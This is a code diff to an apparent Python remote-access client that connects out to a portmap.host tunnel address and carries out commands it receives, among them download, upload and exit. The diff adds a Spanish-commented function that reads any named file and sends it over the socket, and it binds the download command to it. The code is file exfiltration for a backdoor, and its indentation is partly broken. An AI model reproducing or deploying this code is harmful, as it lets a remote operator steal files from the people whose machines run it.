@@ -8,6 +8,30 @@ host = 'coookiesamcream32-63591.portmap.host'
 port = 63591
 
 
+def enviar(filename):
+ while True:
+        f = open(filename , "rb")
+        content = f.read(1024)
+        
+        while content:
+            # Enviar contenido.
+            s.send(content)
+            content = f.read(1024)
+        
+        break
+    
+    # Se utiliza el caracter de código 1 para indicar
+    # al cliente que ya se ha enviado todo el contenido.
+    try:
+        s.send(chr(1))
+    except TypeError:
+        # Compatibilidad con Python 3.
+        s.send(bytes(chr(1), "utf-8"))
+    
+    # Cerrar conexión y archivo.
+    f.close()
+    print("El archivo ha sido enviado correctamente.")
+
 
 def receive_file_size(sck: socket.socket):
         fmt = "<Q"
@@ -65,7 +89,7 @@ while True:
         except FileNotFoundError:
             pass
      elif orden.split(" ")[0] == "download":
-        send_file(s,orden.split(" ")[1])
+        enviar(orden.split(" ")[1])
      elif orden.split(" ")[0] == "upload":
         receive_file(s,orden.split(" ")[2])
      elif orden == "exit":
